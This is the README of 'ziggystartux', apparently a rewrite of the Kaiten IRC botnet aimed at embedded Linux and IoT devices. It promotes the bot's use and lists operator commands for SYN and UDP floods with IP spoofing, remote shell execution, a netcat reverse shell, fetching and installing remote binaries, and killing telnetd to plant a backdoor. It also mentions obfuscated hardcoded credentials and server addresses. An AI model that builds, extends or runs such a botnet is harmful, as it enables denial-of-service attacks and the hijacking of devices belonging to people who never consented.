# ziggystartux
A Kaiten rewrite, with much new functionality, and many fixes for the old stuff! Tailored toward embedded Linux devices, because... well, the internet of things is the new frontier!
# Whats new
Nothing, really. Just doing some maint to avoid confusion. Ziggy-latest is the latest version. Note that now the password to<br>
enable and disable is hardcoded. Passwords, server ips, etc are encoded using the hide.c tool. You really need to read the <br>
code to understand this version, it's not compicated though.

  This is a remake of Kaiten, hacked together from various versions scattered 
  throughout cyberspace. New features include a variety of awesome shell one- 
  liners, ability to upgrade the bot over http (via gcc or static binary), a  
  feature called "HackPkg" that installs binaries without dependencies like   
  wget or tftp, and more! Tip: run GETBB <tftp ip> first to get the most out  
  of this bot (it will install to /var/bin, which is almost always writable). 
  The LOCKUP command will kill telnetd and run a backdoor of your choice (for 
  simplicity we assume you will run it on port 23). This bot is updated often,
  so check back frequently for new killer features and ddos tools. In memory  
  of David Bowie, because he was an awesome musician and passed during the    
  early development of this bot. By ShellzRuS and all the other developers    
  that have worked on Kaiten over the last 20 years.

    This is a IRC based distributed denial of service client.  It connects to 
  the server specified below and accepts commands via the channel specified.  
  The syntax is:                                                              
        !<nick> <command>                                                     
  You send this message to the channel that is defined later in this code.    
  Where <nick> is the nickname of the client (which can include wildcards)    
  and the command is the command that should be sent.  For example, if you   
  want to tell all the clients with the nickname starting with N, to send you 
  the help message, you type in the channel:                                  
        !N HELP                                                              
  That will send you a list of all the commands.  You can also specify an     
  astrick alone to make all client do a specific command:                     
        ! SH uname -a                                                        
  There are a number of commands that can be sent to the client:              
        PAN <target> <port> <secs> - A SYN flooder                         
        UDP <target> <port> <secs> - An UDP flooder                        
        UNKNOWN <target> <secs> - Another non-spoof udp flooder         
        NICK <nick> - Changes the nick of the client  
        SERVER <server> - Changes servers              
        GETSPOOFS - Gets the current spoofing    
        SPOOFS <subnet> - Changes spoofing to a subnet          
        DISABLE - Disables all packeting from this bot  
        ENABLE - Enables all packeting from this bot   
        KILL - Kills Ziggy                           
        GET <http address> <save as> - Downloads a file off the web          
        VERSION - Requests version of bot               
        KILLALL - Kills all current packeting          
        HELP - Displays this                         
        IRC <command>  - Sends this command to the server      
        SH <command> - Executes a command                    
        ISH <command> - "Interactive" SH, send to channel
        BASH <command> - Run a bash command
        SHD <command> - Daemonize command                     
        UPDATE <http://server/bot> - Update this bot 
        HACKPKG <http://server/bin> - Install binary (no wget dependency)
        INSTALL <http://server/bin> - Install binary (via wget)             
        BINUPDATE <http://server/bin> - Update a binary (via wget)      
        SCAN <nmap opts> - Call an nmap wrapper script           
        GETSSH <http:serverdropbear> - Install dropbear, run on port 30022
        RSHELL <ip port> - Equates to nc ip port     
        GETBB <tftp server> - Get a proper busybox (via tftp) 
        LOCKUP <http://server/bin> - Kill telnet, install a backdoor!
                                                                              
  Remember, all these commands must be prefixed by a ! and the nickname that  
  you want the command to be sent to (can include wildcards). There are no    
  spaces in between the ! and the nickname, and there are no spaces before    
  the !                                                                       
                                                                              
                                - contem on efnet
